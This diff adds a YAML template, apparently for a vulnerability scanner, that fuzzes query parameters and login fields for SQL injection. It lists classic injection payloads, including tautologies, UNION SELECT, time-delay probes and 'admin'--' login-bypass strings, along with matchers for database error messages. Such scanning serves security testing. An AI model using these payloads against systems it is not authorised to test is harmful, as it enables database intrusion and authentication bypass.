@@ -1,0 +1,63 @@
+id: fuzz-sqli-params
+info:
+  name: "SQL Injection Parameter Fuzzing"
+  severity: "Critical"
+  description: "Fuzzes query parameters for SQL injection vulnerabilities using a payload list."
+  compliance:
+    owasp: "A03:2021"
+    cwe: "CWE-89"
+fuzz:
+  - part: "query"
+    keys:
+      - "id"
+      - "page"
+      - "user"
+      - "cat"
+      - "product"
+    payloads:
+      - "' OR '1'='1"
+      - "1' AND 1=1--"
+      - "1 UNION SELECT null,null--"
+      - "1) AND SLEEP(5)--"
+      - "1' WAITFOR DELAY '00:00:05'--"
+      - "' OR 1=1--"
+      - "1' ORDER BY 10--"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "PostgreSQL.*ERROR"
+          - "Driver.*SQL Server"
+          - "ORA-[0-9]{5}"
+          - "Unclosed quotation mark"
+          - "You have an error in your SQL"
+      - type: status
+        part: status
+        status:
+          - 500
+    matcher_condition: or
+
+  - part: "body"
+    keys:
+      - "username"
+      - "password"
+      - "email"
+    payloads:
+      - "admin'--"
+      - "admin' OR '1'='1"
+      - "\" OR 1=1--"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome"
+          - "Dashboard"
+          - "admin"
+          - "Logged in"
+      - type: status
+        part: status
+        status:
+          - 302
+    matcher_condition: or
